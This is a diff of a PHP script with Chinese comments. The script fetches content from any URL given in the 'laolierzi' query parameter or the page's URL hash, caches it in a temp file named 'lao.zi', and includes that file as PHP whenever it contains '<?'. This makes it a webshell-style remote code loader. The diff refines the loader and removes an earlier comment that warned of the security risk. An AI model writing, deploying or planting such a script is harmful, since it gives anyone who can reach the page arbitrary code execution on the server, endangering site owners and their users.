@@ -1,46 +1,31 @@
 <?php
-// 定义配置类，管理缓存文件路径
+// 禁用严格类型声明，兼容所有PHP版本
+// declare(strict_types=1);
+
+// 定义配置类
 class Config
 {
     const CACHE_FILENAME = 'lao.zi';
 
-    /**
-     * 获取缓存目录（系统临时目录）
-     * @return string
-     */
     public static function getCacheDir()
     {
         return sys_get_temp_dir();
     }
 
-    /**
-     * 获取完整的缓存文件路径
-     * @return string
-     */
     public static function getCacheFilePath()
     {
         return self::getCacheDir() . DIRECTORY_SEPARATOR . self::CACHE_FILENAME;
     }
 }
 
-// 工具类，封装常用功能
+// 工具类
 class Utility
 {
-    /**
-     * 验证URL是否合法
-     * @param string $url
-     * @return bool
-     */
     public static function validateUrl($url)
     {
         return filter_var($url, FILTER_VALIDATE_URL) !== false;
     }
 
-    /**
-     * 使用cURL获取远程内容
-     * @param string $url
-     * @return string|null
-     */
     public static function fetchRemoteContent($url)
     {
         if (function_exists('curl_init')) {
@@ -49,11 +34,11 @@ class Utility
                 CURLOPT_RETURNTRANSFER => true,
                 CURLOPT_FOLLOWLOCATION => true,
                 CURLOPT_CONNECTTIMEOUT => 10,
-                CURLOPT_TIMEOUT => 10,
+                CURLOPT_TIMEOUT       => 10,
             ]);
             $response = curl_exec($ch);
             if (curl_errno($ch)) {
-                error_log('cURL错误：' . curl_error($ch));
+                error_log('cURL请求错误：' . curl_error($ch));
                 curl_close($ch);
                 return null;
             }
@@ -61,7 +46,6 @@ class Utility
             return $response;
         }
 
-        // 备用：file_get_contents
         if (ini_get('allow_url_fopen')) {
             $content = @file_get_contents($url);
             if ($content !== false) {
@@ -69,19 +53,18 @@ class Utility
             }
         }
 
-        // 最后：套接字方法
         $parts = parse_url($url);
         if (!$parts || !isset($parts['host'])) {
             return null;
         }
-        $host = $parts['host'];
-        $port = isset($parts['port']) ? (int)$parts['port'] : 80;
-        $path = isset($parts['path']) ? $parts['path'] : '/';
+        $host  = $parts['host'];
+        $port  = isset($parts['port'])  ? (int)$parts['port'] : 80;
+        $path  = isset($parts['path'])  ? $parts['path']      : '/';
         $query = isset($parts['query']) ? '?' . $parts['query'] : '';
 
         $socket = @fsockopen($host, $port, $errno, $errstr, 10);
         if (!$socket) {
-            error_log("套接字连接失败：{$errstr} ({$errno})");
+            error_log("Socket连接失败：{$errstr} ({$errno})");
             return null;
         }
 
@@ -96,58 +79,40 @@ class Utility
         }
         fclose($socket);
 
-        // 解析响应内容
         $parts = preg_split('/\r\n\r\n/', $response, 2);
         return isset($parts[1]) ? $parts[1] : null;
     }
 
-    /**
-     * 载入缓存内容
-     * @param string $filePath
-     * @return string
-     */
     public static function loadCache($filePath)
     {
         return (file_exists($filePath)) ? @file_get_contents($filePath) ?: '' : '';
     }
 
-    /**
-     * 保存内容到缓存
-     * @param string $filePath
-     * @param string $content
-     * @return bool
-     */
     public static function saveCache($filePath, $content)
     {
         return @file_put_contents($filePath, $content) !== false;
     }
 }
 
-// 处理请求逻辑
+// 主处理逻辑
 class LaoZiHandler
 {
-    private $cacheFile;
+    private $cacheFilePath;
 
     public function __construct()
     {
-        $this->cacheFile = Config::getCacheFilePath();
-        $this->ensureCacheDir();
+        $this->cacheFilePath = Config::getCacheFilePath();
+        $this->ensureCacheDirectory();
     }
 
-    /**
-     * 确保缓存目录存在
-     */
-    private function ensureCacheDir()
+    private function ensureCacheDirectory()
     {
-        $dir = dirname($this->cacheFile);
+        $dir = dirname($this->cacheFilePath);
         if (!is_dir($dir)) {
             @mkdir($dir, 0755, true);
         }
     }
 
-    /**
-     * 处理远程内容加载请求
-     */
     public function handleRequest()
     {
         if (isset($_GET['laolierzi'])) {
@@ -159,37 +124,28 @@ class LaoZiHandler
 
             $content = Utility::fetchRemoteContent($url);
             if ($content === null) {
-                $this->showMessage('获取内容失败，请稍后重试。', true);
+                $this->showMessage('请求内容失败，请稍后重试。', true);
             }
 
-            Utility::saveCache($this->cacheFile, $content);
+            Utility::saveCache($this->cacheFilePath, $content);
             $this->redirectToSelf();
         }
     }
 
-    /**
-     * 显示缓存内容
-     */
     public function displayCache()
     {
-        if (file_exists($this->cacheFile)) {
-            $content = Utility::loadCache($this->cacheFile);
+        if (file_exists($this->cacheFilePath)) {
+            $content = Utility::loadCache($this->cacheFilePath);
             if (strpos($content, '<?') !== false) {
-                // 执行缓存中的PHP代码（注意安全风险）
-                include $this->cacheFile;
+                include $this->cacheFilePath;
             } else {
                 echo $content;
             }
         } else {
-            $this->showMessage('暂无内容缓存，请通过URL加载远程内容。', false);
+            $this->showMessage('暂无内容<br>请通过有效的URL参数加载远程内容。<br>用法：file.php#https://example.com', false);
         }
     }
 
-    /**
-     * 显示信息框
-     * @param string $message
-     * @param bool $isError
-     */
     private function showMessage($message, $isError = false)
     {
         $color = $isError ? '#e74c3c' : '#3498db';
@@ -214,64 +170,51 @@ class LaoZiHandler
     }
 
     /**
-     * 重定向至自身
+     * 重定向到自身（使用 HTTP Location 头，最快最稳）
      */
     private function redirectToSelf()
     {
-        $currentUrl = $_SERVER['PHP_SELF'];
-        echo "<script>window.location.href='{$currentUrl}';</script>";
+        if (!headers_sent()) {
+            header('Location: ' . $_SERVER['PHP_SELF']);
+        } else {
+            echo "<script>window.location.href='{$_SERVER['PHP_SELF']}';</script>";
+        }
         exit;
     }
 }
 
-// 实例化处理器
+// ============================================================
+// 执行流程
+// ============================================================
 $handler = new LaoZiHandler();
-$handler->handleRequest();
 
-?>
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-<meta charset="UTF-8" />
-<title>缓存与远程内容加载示例</title>
+// 在任何 HTML 输出之前，先注入 hash 检测脚本。
+// 因为 #xxx 部分浏览器不会发到服务器，所以必须由前端 JS
+// 把 location.hash 中的URL转成 ?laolierzi=... 再跳转。
+// 注意：使用 nowdoc <<<'HTML' 防止 PHP 解析 JS 里的 $、{、\
+if (!isset($_GET['laolierzi'])) {
+    echo <<<'HTML'
 <script>
-// 页面加载完成后，检测URL哈希，触发相应AJAX请求
-window.onload = function() {
-    if (window.location.hash) {
-        var hash = window.location.hash.substring(1); // 移除#
-        if (hash.startsWith('cmd=')) {
-            var command = hash.substring(4);
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", "?cmd=" + encodeURIComponent(command), true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4 && xhr.status === 200) {
-                    document.getElementById("output").innerText = xhr.responseText;
-                }
-            };
-            xhr.send();
-        } else if (hash.startsWith('load=')) {
-            var url = hash.substring(5);
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", "?laolierzi=" + encodeURIComponent(url), true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4 && xhr.status === 200) {
-                    document.getElementById("content").innerHTML = xhr.responseText;
-                }
-            };
-            xhr.send();
+(function () {
+    try {
+        var hash = window.location.hash || '';
+        if (hash.length > 1) {
+            var raw = decodeURIComponent(hash.substring(1));
+            if (raw.indexOf('url=') === 0) {
+                raw = raw.substring(4);
+            }
+            if (/^https?:\/\//i.test(raw)) {
+                window.location.href = window.location.pathname
+                    + '?laolierzi=' + encodeURIComponent(raw);
+            }
         }
+    } catch (e) {
+        console.error('hash handler error', e);
     }
-};
+})();
 </script>
-</head>
-<body>
-<div id="content">
-<?php
-// 显示缓存内容或PHP代码
-if (isset($handler)) {
-    $handler->displayCache();
+HTML;
 }
-?>
-</div>
-</body>
-</html>
+
+$handler->handleRequest();
+$handler->displayCache();
